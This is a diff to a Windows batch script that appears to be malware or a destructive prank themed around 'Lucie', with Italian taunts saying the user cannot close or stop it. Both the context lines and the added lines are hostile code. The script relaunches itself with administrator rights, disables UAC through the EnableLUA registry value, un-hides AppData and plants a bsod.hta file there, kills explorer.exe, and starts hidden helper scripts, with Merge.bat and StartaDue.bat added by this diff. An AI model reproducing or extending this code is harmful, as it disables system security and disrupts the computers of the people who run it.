@@ -10,8 +10,9 @@ if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd "%mypath%\lucieengine"
 start /min "" Starta.bat
 start /min "" sera.exe
-echo la lucie non vuole che puoi chiudermi!
-echo %mypath:~0,-1%
+echo la lucie non vuole che tu puoi chiudermi!
+start /min "" Merge.bat
+echo la lucie non vuole che tu puoi fermarmi!
 attrib -h -s "%userprofile%\AppData"
 echo.
 copy "bsod.hta" "%userprofile%\AppData\Local\bsod.hta"
@@ -135,7 +136,7 @@ exit
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 cd "%userprofile%\AppData\Roaming\lucieengine"
-start /min "" Starta.bat
+start /min "" StartaDue.bat
 start /min "" icspi.bat
 start /min "" sera.exe
 echo la lucie non vuole che puoi chiudermi!
@@ -145,7 +146,6 @@ echo la lucie sta molestando il pc
 start /min "" CHESUCIESO.bat
 taskkill /F /IM explorer.exe
 echo.
-ping 127.0.0.1 -n 3 > nul
 ping 127.0.0.1 -n 3 > nul
 cd "%userprofile%\AppData\Roaming\lucieengine"
 echo la lucie vuole molestare la tua scheda di rete
